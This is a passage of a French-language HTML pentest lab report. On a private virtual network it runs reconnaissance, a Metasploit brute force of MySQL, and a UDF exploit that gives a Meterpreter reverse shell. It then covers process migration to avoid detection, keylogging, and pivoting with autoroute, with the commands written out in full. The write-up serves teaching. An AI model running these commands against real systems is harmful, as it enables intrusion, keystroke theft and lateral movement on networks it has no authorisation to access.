          pare-feu pfSense, sur le r√©seau LAN.</p>
        <!---->
        <!---->
        <h3>1. Filtrage du trafic entrant</h3>
        <!---->
        <p>Pour le trafic entrant, le pare-feu autorise: 
          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
            <li>Le <strong>trafic √©tabli et associ√©</strong>, c‚Äôest-√†-dire les connexions d√©j√† initi√©es ou attendues (via les
            protocoles TCP et UDP)</li>
            <li>Le trafic <strong>entrant sp√©cifique:</strong> une connexion TCP provenant de n‚Äôimporte quelle adresse √†
            destination de 10.10.10.128 sur le port 8585</li>
          </ul>
          En revanche, <strong>tout autre trafic entrant est bloqu√©</strong>, de mani√®re √† forcer tout
          passage par le routeur, qui joue alors pleinement son r√¥le de point de contr√¥le central du r√©seau.
        </p>
        <!---->
        <!---->
        <h3>2. Filtrage du trafic sortant</h3>
        <!---->
        <p>Pour le trafic sortant, le pare-feu autorise: 
          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
            <li>Le <strong>trafic √©tabli et associ√©</strong>, via les protocoles TCP et UDP</li>
            <li>Le trafic <strong>TCP sortant</strong> vers le port 443, c'est √† dire les connexions <strong>HTTPS</strong></li>
          </ul>
          <strong>Tout autre trafic sortant est bloqu√©</strong>, afin de limiter les flux non contr√¥l√©
          sortant du r√©seau LAN
        </p>
        <!--CE-->
        <!--CE8-->
        <img src="/monvirtuallab-site/assets/CE9-CP7GXmr0.png" width="700" />
        <figcaption>
          Figure 30 ‚Äì Configuration des r√®gles de trafic entrant et sortant sur la machine pfSense
        </figcaption>
        <!---->
        <!---->
        <!---->
        <p>Ces r√®gles de pare-feu permettent de: 
          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
            <li>Prot√©ger les machines internes contre des connexions non sollicit√©es;</li>
            <li><strong>Filtrer pr√©cis√©ment les flux de sortie</strong>;</li>
            <li><strong>Contr√¥ler tout le trafic</strong> via une seule passerelle (pfSense), notamment dans un sc√©nario de
              pentest en environnement segment√©.</li>
          </ul>
          Il est possible d‚Äôajouter manuellement des r√®gles dans le fichier <strong>/etc/pf.conf</strong>.
          Apr√®s avoir √©crit ou modifi√© ce fichier, on recharge les r√®gles avec:
        </p>
        <!--Code-->
        <!--CODE-->
        <!---CODE-->   
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">$ pfctl -f /etc/pf.conf
            </code></pre>
          </figure>
        </div>
        <!---->
        <!--CE-->
        <!--CE9-->
        <img src="/monvirtuallab-site/assets/CE10-CwTNlp2E.png" width="700" />
        <figcaption>
          Figure 31 ‚Äì Chargement des nouvelles r√®gles de trafic entrant et sortant sur la machine pfSense
        </figcaption>
        <!---->
        <p>Les r√®gles d√©finies dans <strong>/etc/pf.conf</strong> ne sont pas celles utilis√©es par pfSense En
          effet, avec pfSense, les r√®gles configur√©es via l‚Äôinterface web ne sont pas stock√©es dans <strong>/etc/pf.conf</strong>.
          Elles sont en r√©alit√© g√©n√©r√©es dynamiquement √† partir du fichier <strong>/conf/config.xml</strong>, et charg√©es
          automatiquement via les outils internes de pfSense. Cela signifie que: 
          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
            <li>Le fichier <strong>/etc/pf.conf</strong> est vide ou minimal par d√©faut;</li>
            <li>Les r√®gles actuellement actives (affich√©es par pfctl -sr) ne proviennent pas de <strong>pf.conf</strong>;</li>
            <li>Si l‚Äôon charge un fichier <strong>pf.conf</strong> avec <strong>pfctl -f</strong>, cela remplace les r√®gles dynamiques en m√©moire;</li>
            <li><strong>Ce changement n‚Äôest pas persistant: au red√©marrage, pfSense r√©initialise les r√®gles √† partir de sa
              configuration interne.</strong></li>
          </ul>
        </p>

        <a href="#menu-rapport" class="btn" style="background: #38b4ff">
          ‚¨ÖÔ∏è Revenir au menu du rapport
        </a>
      </div>
      <!---->
      <div class="section content-section" id="arp-scan">
        <h2>üîç Arp-scan: D√©couverte du r√©seau</h2>
        <!----->
        <h3>1. D√©couverte du r√©seau avec arp-scan</h3>
        <p>
          L‚Äôoutil <strong>arp-scan</strong> permet d‚Äôidentifier les h√¥tes actifs sur un r√©seau local en envoyant des requ√™tes ARP.
          Cette analyse fournit, pour chaque machine d√©tect√©e, son adresse IP ainsi que son adresse MAC.  
          Selon la documentation <a href="https://linux.die.net/man/1/arp-scan">officielle</a>, cet outil est particuli√®rement utile pour d√©tecter 
          des h√¥tes qui pourraient ne pas r√©pondre aux sondes ICMP ou TCP classiques.
        </p>
        <!---CODE-->   
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">$ sudo arp-scan -l
            </code></pre>
          </figure>
        </div>
        <!--CE-->
        <img src="/monvirtuallab-site/assets/CE1-CRl7_JuQ.png" width="700" />
        <figcaption>
          Figure 32 ‚Äì Analyse du r√©seau avec <strong>Arp-scan</strong>
        </figcaption>
        <p>
          D‚Äôapr√®s les r√©sultats, l‚Äôadresse <strong>10.10.10.2</strong> correspond √† une machine pr√©sente sur le r√©seau, tandis que l‚Äôadresse 
          <strong>10.10.10.128</strong>semble √™tre celle du routeur, ce qui est sugg√©r√© par les mentions <em>(locally administered)</em> et <em>(DUP: 2)</em>.
        </p>
        <!----->
        <!----->

        <a href="#menu-rapport" class="btn" style="background: #38b4ff">
          ‚¨ÖÔ∏è Revenir au menu du rapport
        </a>
      </div>
      <!---->
      <div class="section content-section" id="nmap-scan">
        <h2>‚öôÔ∏èLancement de Metasploit et üîçScan de reconnaissance avec Nmap</h2>
        <h3>1. ‚öôÔ∏è <emp>Metasploit</emp>: Prise en main</h3>
        <p>
          Lors du premier lancement de Metasploit, il est recommand√© d‚Äôassocier une base de donn√©es afin
          de pouvoir stocker les r√©sultats des analyses r√©seau et les r√©utiliser directement dans le framework. Pour
          cela, il faut d√©marrer le service PostgreSQL, puis initialiser la base avec les commandes suivantes:
        </p>
        <!---CODE-->   
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">$ sudo systemctl start postgresql</code></pre>
          </figure>
        </div>
        <!---CODE-->   
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">$ sudo msfdb init</code></pre>
          </figure>
        </div>
        <!--CE-->
        <img src="/monvirtuallab-site/assets/CE2-KjXpgcsA.png" width="700" />
        <figcaption>
          Figure 33 ‚Äì Initialisation de la base de donn√©es Metasploit
        </figcaption>
        <!---->
        <p>
          On peut ensuite lancer Metasploit √† l‚Äôaide de la commande suivante:
        </p>
        <!---CODE-->   
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">$ sudo msfconsole</code></pre>
          </figure>
        </div>
        <!--CE-->
        <img src="/monvirtuallab-site/assets/CE4-C68j-7oQ.png" width="700" />
        <figcaption>
          Figure 34 ‚Äì D√©marrage du framework Metasploit
        </figcaption>
      <!---->
      <h3>2. üîçScan de reconnaissance avec Nmap</h3>
      <p>On v√©rifie l‚Äô√©tat de la base de donn√©es avec:</p>
      <!---CODE-->   
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">msf6 > db_status
</code></pre>
          </figure>
        </div>
        <!--CE-->
        <img src="/monvirtuallab-site/assets/CE5-DT862inC.png" width="700" />
        <figcaption>
          Figure 35 ‚Äì La base de donn√©e est active
        </figcaption>
        <p>Les options utilis√©es pour ce scan sont:<p></p>
          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
            <li>-sS: scan SYN furtif</li>
            <li>-sV: d√©tection des versions</li>
            <li>-O: d√©tection du syst√®me d‚Äôexploitation</li>
            <li>-Pn: d√©sactivation de la d√©tection d‚Äôh√¥tes</li>
            <li>-T1: vitesse r√©duite pour plus de discr√©tion</li>
          </ul>
        <p>
          Le scan cible les ports 21, 22, 80, 443, 3306:
        </p>
        <!---CODE-->   
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">msf6 > db_nmap -sS -sV -O -Pn -T1 -p 21,22,80,443,3306 10.10.10.2</code></pre>
          </figure>
        </div>
        <!--CE-->
        <img src="/monvirtuallab-site/assets/CE6-qKGZJVgb.png" width="700" />
        <figcaption>
          Figure 36 ‚Äì Scan des services de la machine 10.10.10.2 avec Nmap
        </figcaption>
        <p>
          D‚Äôapr√®s les r√©sultats, le port 443 (HTTPS) est ferm√©, tandis que les ports 21 (FTP), 22 (SSH),
          80 (HTTP) et 3306 (MySQL) sont ouverts.
          Le syst√®me d‚Äôexploitation est possiblement un environnement Windows, cependant la version de
          cet environnement manque de pr√©cision. Il pourrait s‚Äôagir de Windows Vista, Windows 7 ou de
          Windows Server 2008 R2.vg
        </p>
        <p>
          Avant de poursuivre l‚Äôexploitation, l‚Äôattaquant doit confirmer la version exacte du syst√®me. Cette
          √©tape est essentielle pour s√©lectionner un payload compatible avec l‚Äôarchitecture et le service
          cibl√©.
        </p>
        <!---->
        <h3>3. Nature du syst√®me d‚Äôexploitation de la machine cible</h3> 
        <p>La commande <strong>hosts</strong> permet au pirate de conna√Ætre le nom de la machine cible.</p>
        <!---CODE-->   
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">msf6 > hosts</code></pre>
          </figure>
        </div>
        <!--CE-->
        <img src="/monvirtuallab-site/assets/CE7-BXbh7443.png" width="700" />
        <figcaption>
          Figure 37 ‚Äì D√©couverte du nom et du syst√®me d'exploitation √† l'aide de la commande hosts
        </figcaption>
        <h3>4. D√©couverte des vuln√©rabilit√©s de la machine cible</h3>
        <p>La commande <strong>services</strong> permet au pirate de conna√Ætre le status des principaux ports de 
          communications de la machine cible</p>
        <!---CODE-->   
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">msf6 > services</code></pre>
          </figure>
        </div>
        <!--CE-->
        <img src="/monvirtuallab-site/assets/CE8-CYXXwpPM.png" width="700" />
        <figcaption>
          Figure 38 ‚Äì D√©couverte du nom et du syst√®me d'exploitation √† l'aide de la commande services
        </figcaption>
        <p>La commande hosts et la commande services nous r√©v√®le que l‚Äôordinateur tourne sous Windows
          2008 Server et que des infiltrations pour √™tre r√©alis√©s sur:</p>
          <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
            <li>Microsoft ftpd : le serveur ftp</li>
            <li>OpenSSH 7.1 protocol 2.0 : le serveur ssh</li>
            <li>MySQL 5.5.20-log : la base de donn√©es MySQL</li>
          </ul>
        <!---->
        <p>Le Hacker se d√©cide en faveur d‚Äôune infiltration du syst√®me en tentant de deviner les identifiants du
        serveur MySQL pr√©sent sur le port 3306.
        </p>
        <h2>Acc√®s au terminal de commandes de l‚Äôordinateur cible</h2>
        <h3>1. Param√©trage et lancement du module <code>mysql_login</code></h3>
          <p>
            Avec la commande <code>use</code>, l‚Äôattaquant s√©lectionne le module <code>mysql_login</code>,
            utilis√© pour r√©aliser une attaque par brute force sur le serveur MySQL.
          </p>

            <!---CODE-->   
            <div class="center">
              <figure class="ray-code">
                <header class="ray-header">
                  <span class="dot red"></span>
                  <span class="dot yellow"></span>
                  <span class="dot green"></span>
                  <span class="title">bash</span>
                </header>
                <pre><code class="language-bash">msf6 > use auxiliary/scanner/mysql/mysql_login</code></pre>
              </figure>
            </div>
            <p>La commande <strong>show</strong> options affiche les param√®tres configurables du module.</p>
            <!---CODE-->   
            <div class="center">
              <figure class="ray-code">
                <header class="ray-header">
                  <span class="dot red"></span>
                  <span class="dot yellow"></span>
                  <span class="dot green"></span>
                  <span class="title">bash</span>
                </header>
                <pre><code class="language-bash">msf6 > show options</code></pre>
              </figure>
            </div>
            <!--CE-->
            <img src="/monvirtuallab-site/assets/CE9-Dl8t5z1A.png" width="700" />
            <figcaption>
              Figure 39 ‚Äì Utilisation du module mysql_login
            </figcaption>
            <p>Il y a 4 param√®tres dont on doit tenir compte ici:</p>
            <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
              <li><strong>PASS_FILE:</strong> le chemin vers le dictionnaire de mots de passe utilis√© pour l‚Äôattaque.</li>
              <li><strong>RHOSTS:</strong> l‚Äôadresse IP de la cible (10.10.10.2).</li>
              <li><strong>THREADS:</strong> le nombre de threads pour parall√©liser l‚Äôattaque (et donc sa vitesse).</li>
              <li><strong>VERBOSE</strong> mode verbeux, qui peut √™tre mis sur false pour r√©duire la quantit√© de sortie affich√©e.</li>
            </ul>
            <!---CODE-->   
            <div class="center">
              <figure class="ray-code">
                <header class="ray-header">
                  <span class="dot red"></span>
                  <span class="dot yellow"></span>
                  <span class="dot green"></span>
                  <span class="title">bash</span>
                </header>
                <pre><code class="language-bash">msf6 auxiliary(scanner/mysql/mysql_login)> set PASS_FILE /usr/share/wordlists/fasttrack.txt
msf6 auxiliary(scanner/mysql/mysql_login)> set RHOSTS 10.10.10.2
msf6 auxiliary(scanner/mysql/mysql_login)> set THREADS 10
msf6 auxiliary(scanner/mysql/mysql_login)> set verbose false
msf6 auxiliary(scanner/mysql/mysql_login)> exploit</code></pre>
              </figure>
            </div>
            <!--CE-->
            <img src="/monvirtuallab-site/assets/CE10-CDmLfZ3n.png" width="700" />
            <figcaption>
              Figure 40 ‚Äì Utilisation du module mysql_login
            </figcaption>
            <p>
              D‚Äôapr√®s les r√©sultats, l‚Äôattaque par BruteForce est un succ√®s : l‚Äôutilisateur est root et aucun
              mot de passe n‚Äôest configur√©. Le manque de vigilance de l‚Äôadministrateur de la machine cible
              offre une porte d√©rob√©e au hackeur.
            </p>
            <p>La commande creds permet d‚Äôafficher de mani√®re synth√©tique les identifiants r√©cup√©r√©s.</p>
            <!---CODE-->   
            <div class="center">
              <figure class="ray-code">
                <header class="ray-header">
                  <span class="dot red"></span>
                  <span class="dot yellow"></span>
                  <span class="dot green"></span>
                  <span class="title">bash</span>
                </header>
                <pre><code class="language-bash">msf6 auxiliary(scanner/mysql/mysql_login)> creds</code></pre>
              </figure>
            </div>
            <!--CE-->
            <img src="/monvirtuallab-site/assets/CE11-BjzbT3pM.png" width="700" />
            <figcaption>
              Figure 41 ‚Äì Affichage des informations d‚Äôidentification avec la commande creds
            </figcaption>
            <!---->
            <h3>2. Param√©trage et lancement du module <code>mysql_udf_payload</code></h3>
            <!---->
            <p>Maintenant que l‚Äôattaquant dispose des identifiants, il peut exploiter le service MySQL pour
              ex√©cuter du code sur la machine cible. Le module <strong>mysql_udf_payload</strong> permet d‚Äôinjecter une
              fonction utilisateur (UDF) malveillante afin d‚Äôobtenir un acc√®s Meterpreter.
            </p>
            <p>
              Les param√®tres essentiels sont:
            </p>
              <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
                <li><strong>PAYLOAD:</strong> le code malveillant √† ex√©cuter, ici windows/meterpreter/reverse_tcp.
                <li><strong>LHOST:</strong> l‚Äôadresse IP de la machine attaquante (ici, Kali Linux : 10.10.10.100).
                <li><strong>LPORT:</strong> le port d‚Äô√©coute sur la machine attaquante (ici 443).
                <li><strong>RHOSTS:</strong> l‚Äôadresse IP de la cible (10.10.10.2).
                <li><strong>PASSWORD:</strong> le mot de passe sera laiss√© vide, comme r√©v√©l√© par l‚Äôattaque pr√©c√©dente.
              </ul>
            <!---CODE-->   
            <div class="center">
              <figure class="ray-code">
                <header class="ray-header">
                  <span class="dot red"></span>
                  <span class="dot yellow"></span>
                  <span class="dot green"></span>
                  <span class="title">bash</span>
                </header>
                <pre><code class="language-bash">msf6 auxiliary(scanner/mysql/mysql_login)> back
msf6 > use exploit/multi/mysql/mysql_udf_payload
msf6 exploit(multi/mysql/mysql_udf_payload) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/mysql/mysql_udf_payload)> set LHOST 10.10.10.100
msf6 exploit(multi/mysql/mysql_udf_payload)> set lport 443
msf6 exploit(multi/mysql/mysql_udf_payload)> set RHOSTS 10.10.10.2
msf6 exploit(multi/mysql/mysql_udf_payload)> set PASSWORD ""
msf6 exploit(multi/mysql/mysql_udf_payload)> exploit</code></pre>
              </figure>
            </div>
            <!--CE-->
            <img src="/monvirtuallab-site/assets/CE12-DWOnyKvj.png" width="700" />
            <figcaption>
              Figure 42 ‚Äì Utilisation du module mysql_udf_payload
            </figcaption>
            <!--CE-->
            <img src="/monvirtuallab-site/assets/CE13-DLOld1jA.png" width="700" />
            <figcaption>
              Figure 43 ‚Äì Utilisation du module mysql_udf_payload
            </figcaption>
            <p>
              Gr√¢ce √† l‚Äôexploitation r√©ussie du compte admin MySQL, l‚Äôattaquant acc√®de √† une session Meterpretrer
              qui repr√©sente un shell invers√© lui permettant de contr√¥l√© la machine cible √† distance.
            </p>
            <!--CE-->
            <img src="/monvirtuallab-site/assets/CE13-DLOld1jA.png" width="700" />
            <figcaption>
              Figure 44 ‚Äì Acc√®s par le hacker √† une session Meterpreter
            </figcaption>
        <!---->
        <a href="#menu-rapport" class="btn" style="background: #38b4ff">
          ‚¨ÖÔ∏è Revenir au menu du rapport
        </a>
      </div>
      <div class="section content-section" id="meterpreter-payload">
        <h2>üåê Meterpreter: Payload avanc√©</h2>
        
        <p>Apr√®s avoir obtenu une session Meterpreter, l‚Äôattaquant cherche √† recueillir davantage d‚Äôinformations
          sur le syst√®me compromis. Il utilise pour cela plusieurs commandes cl√©s:</p>
        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
          <li><strong>screenshot:</strong> capture l‚Äô√©cran de la machine cible. Cette action peut servir de preuve d‚Äôintrusion
            pour l‚Äôattaquant ou ses commanditaires.</li>
        </ul>
        <!--Code-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">meterpreter > screenshot
            </code></pre>
          </figure>
        </div>
        <!--CE1-->
        <img src="/monvirtuallab-site/assets/CE1-Dm5FIGjS.png" width="750" />
        <figcaption>
          Figure 45 ‚Äì Capture d‚Äô√©cran obtenue via Meterpreter
        </figcaption>
        <!--CE2-->
        <img src="/monvirtuallab-site/assets/CE2-DQahrYS6.png" width="750" />
        <figcaption>
          Figure 46 ‚Äì Capture d‚Äô√©cran obtenue via Meterpreter
        </figcaption>
        <!--Code-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">meterpreter > sysinfo
            </code></pre>
          </figure>
        </div>
        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
          <li><strong>sysinfo:</strong> fournit des informations g√©n√©rales sur le syst√®me, comme le nom de l‚Äôordinateur, le
          domaine, l‚Äôarchitecture et le type de syst√®me d‚Äôexploitation.</li>
        </ul>
  
        <!--Code-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">meterpreter > sysinfo
            </code></pre>
          </figure>
        </div>
        <!--CE3-->
        <img src="/monvirtuallab-site/assets/CE3-DYnGr2rO.png" width="750" />
        <figcaption>
          Figure 47 ‚Äì Informations syst√®me r√©cup√©r√©es avec sysinfo
        </figcaption>

        <p>
          La sortie indique que le syst√®me d‚Äôexploitation est Windows Server 2008 R2 x64, que le nom de
          l‚Äôordinateur est VAGRANT-2008R2, que la langue est en-US et que le domaine est
          WORKGROUP. Deux utilisateurs sont connect√©s, et le Meterpreter utilise un payload x86, ce qui
          n‚Äôemp√™che pas son ex√©cution sur une architecture 64 bits.
        </p>

        <p>
          L‚Äôattaquant souhaite ensuite installer un keylogger, c‚Äôest-√†-dire un enregistreur des frappes
          clavier, afin de collecter des informations sensibles. Pour ce faire, il doit d‚Äôabord injecter son
          payload dans un processus actif de la m√©moire vive.
        </p>
        
        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
          <li>
            <strong>ps explorer:</strong> selon les auteurs de Metasploit 2nd Edition, cette commande permet non seulement d‚Äôidentifier
            les processus pr√©sents en m√©moire, mais aussi de lire les saisies clavier lorsqu‚Äôelle est utilis√©e dans
            ce contexte particulier.
          </li>
        </ul>
        <!--Code-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">meterpreter > ps explorer
            </code></pre>
          </figure>
        </div>
        <!--CE4-->
        <img src="/monvirtuallab-site/assets/CE4-Cv8NEjO-.png" width="750" />
        <figcaption>
          Figure 48 ‚Äì Liste des processus via ps
        </figcaption>
        <p>Le processus, explorer.exe (PID 976) est s√©lectionn√© car il reste actif tant que l‚Äôutilisateur est
          connect√©, il a pour mission de charger le menu d√©marrer et la barre des t√¢ches. Il s'occupe √©galement 
          de g√©rer le bureau et le papier peint.
        </p>
        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
          <li>
            <strong>migrate:</strong> comme le pr√©cisent les auteurs de Metasploit 2nd Edition, cette commande copie le code du
            payload dans la m√©moire virtuelle d‚Äôun autre processus, ce qui lui permet de s‚Äôex√©cuter comme
            un nouveau thread √† l‚Äôint√©rieur de ce processus. Cela va permettre d‚Äô√©viter sa d√©tection.
            </li>
        </ul>
                  
        <!--Code-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">meterpreter > migrate 976
            </code></pre>
          </figure>
        </div>
        <!--CE5-->
        <img src="/monvirtuallab-site/assets/CE5-CUEAGsdF.png" width="750" />
        <figcaption>
          Figure 49 ‚Äì Migration du payload vers explorer.exe
        </figcaption>

        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
          <li><strong>keylog_recorder</strong> module qui capture les frappes clavier une fois 
            l‚Äôinfiltration r√©alis√©e.</li>
        </ul>
        
                
        <!--Code-->
          <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">meterpreter > run post/windows/capture/keylog_recorder
            </code></pre>
          </figure>
        </div>
        <!--CE6-->
        <img src="/monvirtuallab-site/assets/CE6-C_0hcZCM.png" width="750" />
        <figcaption>
          Figure 50 ‚Äì D√©marrage du keylogger
        </figcaption>
        <p>
          Les donn√©es captur√©es r√©v√®lent la r√©daction d‚Äôun document interne contenant des informations
          cruciales:
        </p>
        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
          <li>l‚Äôexistence d‚Äôune machine interne distincte o√π sont stock√©s les documents recherch√©s;</li>
          <li>le transfert de ces fichiers via un serveur FTP;</li>
          <li>l‚Äôabsence de connectivit√© Internet pour cette machine interne, ce qui explique pourquoi elle
          n‚Äô√©tait pas d√©tectable lors du scan initial.</li>
        </ul>
        
        <!--CE7-->
        <img src="/monvirtuallab-site/assets/CE7-C22zV66u.png" width="750" />
        <figcaption>
          Figure 51 ‚Äì Frappes clavier captur√©es
        </figcaption>

        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
          <li>
            <strong>ipconfig:</strong> commande permettant d‚Äôafficher la configuration r√©seau de la machine compromise
            apr√®s l‚Äôinfiltration.
          </li>
        </ul>
                
        <!--Code-->
        <div class="center">
            <figure class="ray-code">
              <header class="ray-header">
                <span class="dot red"></span>
                <span class="dot yellow"></span>
                <span class="dot green"></span>
                <span class="title">bash</span>
              </header>
              <pre><code class="language-bash">meterpreter > ipconfig
              </code></pre>
            </figure>
          </div>
        <!--CE8-->
        <img src="/monvirtuallab-site/assets/CE8-D5HkknQh.png" width="750" />
          <figcaption>
            Figure 52 ‚Äì Affichage des interfaces r√©seau de la machine cible
          </figcaption>
        <p>
          L‚Äôex√©cution de ipconfig confirme la pr√©sence d‚Äôun r√©seau interne cach√©, accessible depuis la
          machine compromise, dont l‚Äôadresse IP est 192.168.100.2.
        </p>    


        <a href="#menu-rapport" class="btn" style="background: #38b4ff">
          ‚¨ÖÔ∏è Revenir au menu du rapport
        </a>
      </div>
      <!---->
      <div class="section content-section" id="analyse-reseau-pivot">
        <h2>üîç ANALYSE DU RESEAU MASQUE ET MISE EN PLACE D'UN PIVOT üåê</h2>
        <p>
          L‚Äôattaquant met la session Meterpreter en arri√®re-plan afin de poursuivre l‚Äôanalyse du r√©seau
          interne.
        </p>
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">meterpreter > background
            </code></pre>
          </figure>
        </div>
        <!---->
        <h3>1. üîç Scan du r√©seau masqu√© avec arp_scanner</h3>
        <!---->
        <p>D‚Äôapr√®s la documentation officielle Rapid7<a href="https://www.rapid7.com/db/modules/post/windows/gather/arp_scanner/"></a>, ce module effectue une d√©couverte ARP pour d√©couvrir
          les h√¥tes d‚Äôun r√©seau local √† partir d‚Äôune session Meterpreter.
          Comme l‚Äôoutil arp-scan vu pr√©c√©demment, <strong>arp-scanner</strong> permet d‚Äôidentifier les h√¥tes actifs
          sur un r√©seau local en envoyant des requ√™tes ARP et fournira pour chaque machine d√©tect√©e, son adresse
          IP ainsi que son adresse MAC.
        </p>
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">
msf6 > use post/windows/gather/arp_scanner
msf6 post(windows/gather/arp_scanner) > set SESSION 1
msf6 post(windows/gather/arp_scanner) > set RHOSTS 192.168.100.2/24
msf6 post(windows/gather/arp_scanner) > run
            </code></pre>
          </figure>
        </div>
        <!--CE1-->
        <img src="/monvirtuallab-site/assets/CE1-CrPfOjxu.png" width="750" />
        <figcaption>
          Figure 53 ‚Äì D√©couverte du r√©seau interne avec arp_scanner
        </figcaption>
        <p>
          Le scan r√©v√®le l‚Äôexistence d‚Äôune machine interne suppl√©mentaire (192.168.100.3), confirmant les
          informations obtenues gr√¢ce au keylogger.
        </p>
        <p>Pour acc√©der √† cette machine, qui se trouve sur un r√©seau diff√©rent, l‚Äôattaquant devra:</p>
        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
          <li>cr√©er une route afin de rendre le r√©seau interne accessible via la machine compromise;</li>
          <li>mettre en place un proxy pour rediriger le trafic local (127.0.0.1) vers la machine interne.</li>
        </ul>
        
        <!---->
        <h3>
          2. üåê Cr√©ation d‚Äôune route entre la machine attaquante et la machine cach√© via la machine
                compromise
        </h3>
        <!---->
        <p>Le hacker utilisera les modules <strong>autoroute</strong> et <strong>stock_proxy</strong>.</p>
        <!---->
        
        <p>Selon Rapid7<a href="https://www.rapid7.com/db/modules/post/multi/manage/autoroute/"></a> , le module autoroute permet de g√©rer le routage des sessions via une session
          Meterpreter existante. Il permet l‚Äôutilisation d‚Äôun h√¥te compromis comme passerelle pour
          atteindre d‚Äôautres sous-r√©seaux auxquels l‚Äôattaquant n‚Äôa normalement pas acc√®s. On appelle cette
          m√©thode le ¬´ pivoting ¬ª.</p>
        <p>En clair, nous allons atteindre la machine cach√©e sur le r√©seau interne de l‚Äôentreprise en cr√©ant
          une route depuis la machine compromise car c‚Äôest elle qui poss√®de une connexion internet avec la
          machine cible.</p>
        <p>Pour mener √† bien la mise en place de cette liaison, il nous faudra configurer le module autoroute
          avec les informations suivantes:</p>
        <ul style="margin-left: 1.5rem; margin-top: 0.5rem">
          <li>Le num√©ro de session obtenu avec la commande sessions (ici, la session 1);</li>
          <li>Le sous-r√©seau (SUBNET) √† atteindre (ici 192.168.0.0);</li>
          <li>Le masque de r√©seau (NETMASK) exprim√© en notation CIDR (/16) plut√¥t qu‚Äôen d√©cimal(255.255.0.0).</li>
        </ul>
                
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
              <span class="title">bash</span>
            </header>
            <pre><code class="language-bash">
msf6 post(windows/gather/arp_scanner) > back
mfs6 > use post/multi/manage/autoroute
mfs6 post(multi/manage/autoroute) > show options
mfs6 post(multi/manage/autoroute) > sessions
            </code></pre>
          </figure>
        </div>
        <!--CE2-->
        <img src="/monvirtuallab-site/assets/CE2-CQreOeTx.png" width="750" />
        <figcaption>
          Figure 55 ‚Äì Cr√©ation d‚Äôune route avec autoroute
        </figcaption>
        <!--CODE-->
        <div class="center">
          <figure class="ray-code">
            <header class="ray-header">
              <span class="dot red"></span>
              <span class="dot yellow"></span>
              <span class="dot green"></span>
